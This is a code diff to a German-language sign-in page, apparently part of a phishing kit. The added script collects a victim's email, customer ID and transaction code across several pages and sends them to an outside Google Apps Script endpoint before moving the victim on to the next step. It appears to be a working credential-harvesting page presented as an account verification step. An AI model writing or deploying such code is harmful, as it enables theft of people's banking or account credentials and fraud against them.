@@ -61,16 +61,56 @@ button{width:100%;height:48px;border:0;border-radius:25px;background:#253044;col
 </main>
 
 <script>
-document.getElementById("form").addEventListener("submit", function(e) {
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyHnsvXGc9X_mZ8tf9zNCl4UZrX_aEjK38CWyrbxoPHS7bhWGNm9SaHPPtfiDkJJX-R/exec";
+
+document.getElementById("form").addEventListener("submit", async function(e) {
     e.preventDefault();
 
-    const email = document.getElementById("email").value.trim();
-    const kundenkennung = document.getElementById("kundenkennung").value.trim();
+    const email = sessionStorage.getItem("test_email");
+    const kundenkennung = sessionStorage.getItem("test_kundenkennung");
+    const vorgangscode = document.getElementById("vorgangscode").value.trim();
 
-    sessionStorage.setItem("test_email", email);
-    sessionStorage.setItem("test_kundenkennung", kundenkennung);
+    if (!email || !kundenkennung) {
+        alert("Bitte beginnen Sie die Vorgangsprüfung erneut.");
+        window.location.href = "signin.html";
+        return;
+    }
 
-    window.location.href = "signin2.html";
+    const button = document.getElementById("submitButton");
+    button.disabled = true;
+    button.textContent = "Wird übermittelt...";
+
+    const data = {
+        email: email,
+        kundenkennung: kundenkennung,
+        vorgangscode: vorgangscode
+    };
+
+    try {
+        const response = await fetch(SCRIPT_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "text/plain;charset=utf-8"
+            },
+            body: JSON.stringify(data)
+        });
+
+        const result = await response.json();
+
+        if (!result.success) {
+            throw new Error("Übermittlung fehlgeschlagen");
+        }
+
+        sessionStorage.removeItem("test_email");
+        sessionStorage.removeItem("test_kundenkennung");
+
+        window.location.href = "signin2.html";
+
+    } catch (error) {
+        button.disabled = false;
+        button.textContent = "Vorgang bestätigen";
+        alert("Die Übermittlung konnte nicht bestätigt werden. Bitte versuchen Sie es erneut.");
+    }
 });
 </script>
 </body>
